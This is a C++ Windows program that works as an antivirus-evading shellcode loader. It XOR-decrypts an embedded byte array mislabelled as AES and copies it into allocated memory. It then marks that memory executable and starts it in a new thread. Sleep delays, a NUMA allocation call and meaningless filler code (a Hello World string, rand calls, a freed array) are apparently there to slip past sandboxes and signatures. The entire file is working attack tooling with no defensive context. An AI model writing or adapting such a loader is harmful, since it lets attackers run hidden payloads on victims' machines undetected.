#include <math.h>
#include <windows.h>
#include <stdio.h>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <math.h>
#include <windows.h>
#include <stdio.h>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096

// XOR decryption function
void DecryptXOR(char* shellcode, DWORD shellcodeLen, unsigned char* key, DWORD keyLen) {
    for (DWORD i = 0; i < shellcodeLen; i++) {
        shellcode[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
    }
}

//Getting the payload from remote server function
int main() {

    Sleep(2000);
    DWORD nndPreferred = 0xFFFFFFFF;
    Sleep(2000);

    unsigned char AESkey[] = { 0x31, 0x42, 0xb2, 0x68, 0x8e, 0x53, 0xe0, 0x7c, 0xa2, 0x25, 0x67, 0x67, 0x24, 0xa8, 0xb5, 0x2 };
unsigned char AESCode[] = { 0xcd, 0xa, 0x31, 0x8c, 0x7e, 0xbb, 0x20, 0x7c, 0xa2, 0x25, 0x26, 0x36, 0x65, 0xf8, 0xe7, 0x53, 0x67, 0xa, 0x83, 0xba, 0xeb, 0x1b, 0x6b, 0x2e, 0xc2, 0x6d, 0xec, 0x35, 0x3c, 0xe0, 0x3e, 0x50, 0x11, 0xa, 0x39, 0x1a, 0xde, 0x1b, 0xef, 0xcb, 0xe8, 0x6f, 0x2a, 0x56, 0xed, 0xe0, 0x84, 0xc2, 0x9d, 0x7e, 0xd3, 0x14, 0x8c, 0x7f, 0xc0, 0x3d, 0x63, 0xec, 0x6a, 0x26, 0x25, 0x69, 0x57, 0xef, 0x63, 0x3, 0xe3, 0x20, 0x5, 0x1, 0xc0, 0xf7, 0xe0, 0x19, 0x2f, 0x66, 0xf4, 0x23, 0x35, 0x8a, 0x31, 0x42, 0xb2, 0x20, 0xb, 0x93, 0x94, 0x1b, 0xea, 0x24, 0xb7, 0x37, 0xaf, 0xe0, 0xad, 0x46, 0xba, 0x2, 0x92, 0x21, 0x8f, 0x83, 0x3, 0x2a, 0xea, 0xda, 0xae, 0x26, 0xaf, 0x9c, 0x3d, 0x4a, 0x30, 0x94, 0xff, 0x59, 0x47, 0x1b, 0xd1, 0xbc, 0xe, 0x64, 0xa6, 0xae, 0x29, 0xe9, 0xb4, 0xc3, 0x9, 0xa2, 0xc7, 0x99, 0xc2, 0x50, 0xac, 0x58, 0xaa, 0x60, 0x5e, 0xb6, 0x51, 0x70, 0xed, 0x46, 0xba, 0x2, 0x96, 0x21, 0x8f, 0x83, 0x86, 0x3d, 0x29, 0x29, 0x2f, 0x23, 0xaf, 0xe8, 0xa9, 0x4b, 0x30, 0x92, 0xf3, 0xe3, 0x8a, 0xdb, 0xa8, 0x7d, 0x72, 0x64, 0x3f, 0x26, 0x7c, 0xf6, 0xec, 0x58, 0x70, 0x1a, 0xf3, 0x31, 0xcf, 0x9, 0xa8, 0xff, 0x4e, 0x5, 0x26, 0x35, 0xdb, 0x48, 0xed, 0x43, 0x68, 0x18, 0xfa, 0xe3, 0x9c, 0xba, 0xb7, 0x83, 0x5d, 0xda, 0x3a, 0x2e, 0x9a, 0xdf, 0xc6, 0x30, 0x6e, 0x71, 0x80, 0x68, 0x8e, 0x12, 0xb6, 0x35, 0x2b, 0xc3, 0x2f, 0xe6, 0xc8, 0x8, 0xb4, 0x2, 0x31, 0xb, 0x3b, 0x8d, 0xc7, 0xef, 0xe2, 0x7c, 0xbd, 0x65, 0xa7, 0xcf, 0xa6, 0x7, 0xf4, 0x56, 0x78, 0xcb, 0x56, 0x24, 0x7, 0xa2, 0xa1, 0xc6, 0xee, 0x52, 0x41, 0x60, 0xdb, 0x7d, 0xf9, 0x8b, 0xdb, 0x2a, 0xb3, 0x69, 0x8e, 0x53, 0xb9, 0x3d, 0x18, 0xc, 0xe7, 0xc, 0x24, 0x57, 0x60, 0x52, 0x61, 0xf, 0x83, 0xa1, 0xc3, 0x62, 0x20, 0x34, 0x5d, 0xe5, 0x2f, 0xee, 0xe6, 0xe0, 0x4a, 0xc2, 0x79, 0xcb, 0x73, 0x29, 0x34, 0xb9, 0xef, 0xa3, 0x42, 0xda, 0xb2, 0x2f, 0xad, 0x6f, 0xdf, 0x12, 0x70, 0x1a, 0xfe, 0xe1, 0x6c, 0x1b, 0x69, 0x85, 0xe3, 0x9f, 0xfe, 0xc2, 0x50, 0xc9, 0x4a, 0xd7, 0x79, 0xc3, 0x76, 0x28, 0x8c, 0x53, 0xe0, 0x35, 0x1a, 0x46, 0xa, 0x3, 0x24, 0xa8, 0xb5, 0x2, 0x31, 0x3, 0xe2, 0x29, 0xde, 0x1b, 0x69, 0x9e, 0xf5, 0x72, 0x30, 0x2a, 0x15, 0x68, 0xdf, 0xf, 0x68, 0x3, 0xe2, 0x8a, 0x72, 0x35, 0x27, 0x38, 0x86, 0x71, 0x66, 0x66, 0x6c, 0x25, 0xf1, 0x26, 0x29, 0x84, 0xb2, 0x0, 0xc6, 0xda, 0x6, 0x2a, 0xf2, 0x64, 0x37, 0x26, 0x74, 0xe9, 0xe5, 0x4b, 0xce, 0x82, 0xf3, 0x38, 0xc7, 0xac, 0x28, 0x31, 0x2b, 0xe4, 0x2b, 0xee, 0xe5, 0xe9, 0xf, 0x7b, 0xfd, 0x7d, 0x34, 0x97, 0x5b, 0x1b, 0xd1, 0xae, 0xea, 0xda, 0xad, 0xec, 0x2a, 0xe9, 0xf, 0xa, 0xb6, 0x5f, 0xd2, 0x97, 0x5b, 0xe8, 0x10, 0xc9, 0x0, 0x73, 0x26, 0xdd, 0x82, 0x3d, 0x8, 0x9f, 0xce, 0x97, 0xfa, 0xeb, 0x4a, 0x7b, 0xdc, 0x7a, 0xde, 0x2f, 0xe7, 0x9c, 0xc4, 0xdd, 0xb0, 0xb9, 0x76, 0x51, 0xc0, 0x7, 0xe4, 0x53, 0xb9, 0x3d, 0x2b, 0xff, 0x98, 0xb2 }; 

        LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(AESCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, nndPreferred);
	printf("this is very cool");
	int *array = (int *)calloc(5, sizeof(int));
        if (array) {
           array[0] = 1;
           free(array);
        } 
        
        DecryptXOR((char*) AESCode, sizeof(AESCode), AESkey , sizeof(AESkey));
	
	memcpy(memalo, AESCode, sizeof(AESCode));


	DWORD oldProtect;
	char str1[20] = "Hello, ";
        char str2[] = "World!";

	VirtualProtect(memalo, sizeof(AESCode), PAGE_EXECUTE_READ, &oldProtect); 
	int random = rand();


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
	int random2 = rand();
	
	WaitForSingleObject(tHandle, -1);
	getchar();
	

	return 0;

}
